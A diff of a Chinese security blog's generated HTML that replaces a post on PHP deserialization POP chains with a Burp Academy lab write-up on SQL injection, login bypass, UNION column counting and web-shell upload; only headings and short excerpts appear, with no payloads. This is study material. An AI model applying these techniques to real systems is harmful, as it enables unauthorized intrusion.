-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text"> pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#egswpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">1.1.</span> <span class="toc-text"> eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98wp"><span class="toc-number">1.</span> <span class="toc-text"> burp靶场漏洞实战wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8Cwhere%E6%9D%A1%E6%AC%BE%E4%B8%AD%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AE%9E%E9%AA%8C%E5%85%81%E8%AE%B8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.实验：允许登录绕过的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%AE%9E%E9%AA%8Csql%E6%B3%A8%E5%85%A5union%E6%94%BB%E5%87%BB%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.实验：SQL注入UNION攻击，确定查询返回的列数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%80%9A%E8%BF%87%E7%BD%91%E9%A1%B5%E5%A3%B3%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.实验室：通过网页壳上传远程代码执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -565,13 +535,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cl1ck-t0",
-          title: "pop链构造",
-          url: "https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/",
+          title: "burp靶场漏洞实战",
+          url: "https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/",
           excerpt: "",
           description: "",
-          stripContent: " pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危险函数的代码位置，如 eval()、system()、file_put_contents()、i",
-          date: "Thu Feb 19 2026 16:41:25 GMT+0800",
-          updated: "Thu Feb 19 2026 21:36:54 GMT+0800",
+          stripContent: " burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的题目不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=Tech+gifts 看",
+          date: "Tue Mar 31 2026 22:06:57 GMT+0800",
+          updated: "Tue Mar 31 2026 23:29:15 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
